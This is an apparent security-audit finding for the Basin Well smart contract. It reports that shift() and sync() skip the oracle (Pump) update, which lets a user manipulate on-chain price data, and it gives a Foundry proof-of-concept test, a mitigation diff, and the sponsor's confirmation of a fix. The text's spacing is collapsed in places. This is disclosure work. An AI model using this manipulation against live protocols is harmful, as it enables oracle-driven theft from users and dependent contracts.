@@ -1,0 +1,23 @@
+[H-01] Pumps are not updated in the shift() and sync() functions, allowing oracle manipulation
+Submitted byEeyore, also found byLokiThe5th, Trust (1,2),pontifex,oakcobalt, andBrenzee
+https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Well.sol#L352-L377https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Well.sol#L590-L598
+TheWellcontract mandates that thePumpsshould be updated with the previous block’sreservesin casereservesare changed in the current block to reflect the price change accurately.
+However, this doesn’t happen in theshift()andsync()functions, providing an opportunity for any user to manipulate thereservesin the current block before updating thePumpswith new manipulatedreservesvalues.
+Impact
+ThePumps(oracles) can be manipulated. This can affect any contract/protocol that utilizesPumpsas on-chain oracles.
+Proof of Concept
+A malicious user performs ashift()operation to updatereserves to desired amounts in the current block, thereby overriding thereservesfrom the previous block.The user performsswapFrom()/swapTo()operations to extract back the funds used in theshift()function. As a result, the attacker is not affected by any arbitration as poolreservesrevert back to the original state.TheswapFrom()/swapTo()operations trigger thePumpsupdate with invalidreserves, resulting in oracle manipulation.
+Note: Thesync()function can also manipulatereservesin the current block, but it’s less useful thanshift()from an attacker’s perspective.
+PoC Tests
+This test illustrates how to useshift()to manipulatePumpsdata.
+Createtest/pumps/Pump.Manipulation.t.soland runforge test --match-test manipulatePump.
+// SPDX-License-Identifier: MITpragmasolidity^0.8.17;import{TestHelper,Call}from"../TestHelper.sol";import{MultiFlowPump}from"src/pumps/MultiFlowPump.sol";import{from18}from"test/pumps/PumpHelpers.sol";contractPumpManipulationTestisTestHelper{MultiFlowPumppump;functionsetUp()public{pump=newMultiFlowPump(from18(0.5e18),// cap reserves if changed +/- 50% per blockfrom18(0.5e18),// cap reserves if changed +/- 50% per block12,// block timefrom18(0.9e18)// ema alpha);Call[]memory_pumps=newCall[](1);_pumps[0].target=address(pump);_pumps[0].data=newbytes(0);setupWell(2,_pumps);}functiontest_manipulatePump()publicprank(user) {uint256amountIn=1*1e18;// 1. equal swaps, reserves should be unchangeduint256amountOut=well.swapFrom(tokens[0],tokens[1],amountIn,0,user,type(uint256).max);well.swapFrom(tokens[1],tokens[0],amountOut,0,user,type(uint256).max);uint256[]memorylastReserves=pump.readLastReserves(address(well));assertApproxEqAbs(lastReserves[0],1000*1e18,1);assertApproxEqAbs(lastReserves[1],1000*1e18,1);// 2. equal shift + swap, reserves should be unchanged (but are different)increaseTime(120);tokens[0].transfer(address(well),amountIn);amountOut=well.shift(tokens[1],0,user);well.swapFrom(tokens[1],tokens[0],amountOut,0,user,type(uint256).max);lastReserves=pump.readLastReserves(address(well));assertApproxEqAbs(lastReserves[0],1000*1e18,1);assertApproxEqAbs(lastReserves[1],1000*1e18,1);}}
+Tools Used
+Foundry
+Recommended Mitigation Steps
+UpdatePumpsin theshift()andsync()function.
+function shift(IERC20 tokenOut,uint256 minAmountOut,address recipient) external nonReentrant returns (uint256 amountOut) {IERC20[] memory _tokens = tokens();-       uint256[] memory reserves = new uint256[](_tokens.length);+       uint256[] memory reserves = _updatePumps(_tokens.length);
+function sync() external nonReentrant {IERC20[] memory _tokens = tokens();-       uint256[] memory reserves = new uint256[](_tokens.length);+       uint256[] memory reserves = _updatePumps(_tokens.length);
+publiuss (Basin) confirmed and commented:
+This issue has been fixed by updating the Pumps inshift(...)andsync(...):https://github.com/BeanstalkFarms/Basin/blob/91233a22005986aa7c9f3b0c67393842cd8a8e4d/src/Well.sol#L380https://github.com/BeanstalkFarms/Basin/blob/91233a22005986aa7c9f3b0c67393842cd8a8e4d/src/Well.sol#L628
+
